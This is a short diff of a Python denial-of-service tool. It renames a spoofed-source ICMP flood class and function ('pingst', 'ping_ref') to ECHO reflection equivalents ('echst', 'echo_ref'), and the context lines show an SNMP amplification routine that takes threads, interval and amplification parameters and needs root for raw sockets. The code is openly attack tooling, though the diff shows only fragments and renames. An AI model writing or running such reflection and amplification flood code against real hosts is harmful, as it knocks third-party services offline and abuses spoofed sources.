@@ -2344,7 +2344,7 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
     break
   if returning==True:
     return counter
-class pingst(threading.Thread):
+class echst(threading.Thread):
  def run(self):
   global counter
   while (stop!=True):
@@ -2366,9 +2366,9 @@ class pingst(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def ping_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,returning=True):
+def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,returning=True):
  '''
-   this function is for ICMP flood with spoofed sources
+   this function is for ECHO  reflection attack
 '''
  global stop
  stop=False
@@ -2394,7 +2394,7 @@ def ping_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   pingst().start()
+   echst().start()
   c=time.time()
   while True:
    if stop==True:
